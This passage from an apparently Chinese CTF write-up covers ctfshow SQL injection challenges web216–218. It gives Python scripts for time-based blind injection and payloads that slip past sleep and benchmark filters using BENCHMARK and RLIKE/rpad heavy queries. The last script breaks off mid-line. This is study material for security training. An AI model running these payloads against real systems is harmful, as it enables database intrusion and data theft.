class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web216">web216<a href="#web216" class="hash-link" aria-label="Direct link to web216" title="Direct link to web216">​</a></h3>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> where id = from_base64($id);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>闭合这个base64解码即可</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;http://cce5695a-4187-4c62-9e84-e684dbfa8fbb.challenge.ctf.show/api/index.php&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lenth </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">,</span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&quot;ip&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&#x27;&#x27;) or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxcc),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,sleep(0.3),1)#&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                   </span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;debug&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">timeout</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0.29</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">except</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web217">web217<a href="#web217" class="hash-link" aria-label="Direct link to web217" title="Direct link to web217">​</a></h3>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> where id = ($id);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    //屏蔽危险分子</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    function waf($str){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return preg_match(&#x27;/sleep/i&#x27;,$str);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>过滤了sleep，尝试百度mysql 类似sleep函数、mysql休眠函数，都没有百度出什么名堂，看wp发现用到了一个叫benchmark的函数</p>
<p>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数可以很方便地测试某些特定操作的性能</p>
<p>什么意思呢，来看看这张图</p>
<p><img decoding="async" loading="lazy" alt="image-20220110170417664" src="/assets/images/image-20220110170417664-85c00b066e5f3b3d0a6c1e4015c342ff.png" width="486" height="553" class="img_ev3q"></p>
<p>运行一次md5的时间可太短了，但是benchmark就是运行114514 1145140次md5计算出来的时间</p>
<p>值得注意的是，时间是指客户端的经过时间，不是在服务器端的CPU时间。</p>
<p>因此这个在注入的时候，和服务器跟网速有关</p>
<p>因此为了防止注入时间的影响导致flag出错，这里专门设置了sleep</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;http://89b2740e-6baf-48a7-bb82-2929453976d5.challenge.ctf.show/api/index.php&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lenth </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">,</span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&quot;ip&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&#x27;&#x27;) or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,benchmark(1145140,md5(2333)),&#x27;False&#x27;)#&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                   </span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;debug&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">timeout</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0.5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">except</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.8</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>但是就算是这个payload我还是注了6次取交集才交上去，乌鱼子了</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web218">web218<a href="#web218" class="hash-link" aria-label="Direct link to web218" title="Direct link to web218">​</a></h3>
<p>查询语句</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">       where id = ($id);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    //屏蔽危险分子</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    function waf($str){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return preg_match(&#x27;/sleep|benchmark/i&#x27;,$str);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>究极预判了属于是</p>
<p>查了一下，发现有人写过，参考文章<a href="https://www.cnblogs.com/forforever/p/13019703.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/forforever/p/13019703.html</a></p>
<p>1.sleep</p>
<p>2.benchmark</p>
<p>3.笛卡尔积</p>
<p>4.GET_LOCK() 加锁</p>
<p>5.RLIKE REGEXP正则匹配</p>
<div class="language-wow codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-wow codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">等同于sleep(5)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>看完之后发现，我好像和feng师傅看的文章差不多。。。。试试最后一个</p>
<p>天啊，还是注了n次才交上，麻麻子</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;http://3471a536-3547-4d4b-93c6-06020fab5ffe.challenge.ctf.show/api/index.php&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sleep_rep </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) rlike &#x27;(a.*)+(a.*)+b&#x27;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lenth </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">,</span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span 